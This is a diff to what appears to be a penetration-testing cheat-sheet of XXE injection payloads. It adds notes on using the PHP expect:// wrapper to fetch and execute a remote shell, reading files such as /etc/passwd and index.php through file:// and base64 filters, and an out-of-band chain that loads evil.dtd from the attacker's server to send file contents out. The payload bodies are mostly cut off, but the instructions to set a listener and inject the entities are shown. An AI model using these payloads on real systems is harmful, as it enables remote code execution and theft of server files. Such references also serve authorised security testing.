@@ -6,6 +6,8 @@
 
 Spawn XXE RCE with Xxe_injection.
 
+XXE that abuses the `expect://` PHP wrapper to fetch and execute a remote shell. Requires the expect extension to be loaded on the server.
+
 ```sh title:"Xxe Injection Spawn XXE RCE"
 # Inject this into your request and call &company in the right field to execute the payload, remember to set your listener so the target can download your payload.
 <?xml version="1.0"?>
@@ -23,6 +25,8 @@ import tun_ip
 
 Read XXE base64 file read with Xxe_injection.
 
+Use the PHP base64 filter to read a file safely (avoids XML parse errors when source contains `<` or `&`). Decode the result client-side.
+
 ```sh title:"Xxe Injection Read XXE Base64 File Read"
 # Inject this into your request inside the XML field to read 'index.php' and call &company in the right field to execute the payload, decode the result using 'echo $data | base64 -d > file && cat file'
 <!DOCTYPE email [
@@ -39,6 +43,8 @@ var data
 
 Read XXE plaintext file read with Xxe_injection.
 
+Plain `file://` read. Works for files without XML-breaking characters; falls over on PHP source with `<?` tags.
+
 ```sh title:"Xxe Injection Read XXE Plaintext File Read"
 # Inject this into your request inside the XML field to read '/etc/passwd' and call &company in the right field to execute the payload.
 <!DOCTYPE email [
@@ -48,9 +54,9 @@ Read XXE plaintext file read with Xxe_injection.
 
 ### XXE blind OOB
 
-Out-of-band XXE chain: parser fetches `evil.dtd` from your server, embeds the target file contents into a URL, and requests it back. Use when the response body doesn't echo entities.
-
 Read XXE blind OOB with Xxe_injection.
+
+Out-of-band XXE chain: parser fetches `evil.dtd` from your server, embeds the target file contents into a URL, and requests it back. Use when the response body doesn't echo entities.
 
 ```sh title:"Xxe Injection Read XXE Blind OOB"
 Step 1: Set up a file like this called evil.dtd
